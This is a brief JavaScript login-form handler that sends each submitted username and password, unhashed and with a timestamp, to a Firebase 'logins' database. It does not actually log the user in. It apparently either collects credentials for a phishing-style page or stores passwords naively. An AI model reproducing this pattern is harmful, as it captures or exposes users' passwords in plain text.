const db = firebase.database();

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  db.ref("logins").push({
    username: username,
    password: password,
    time: new Date().toLocaleString()
  });

  console.log("Login saved to Firebase");
});
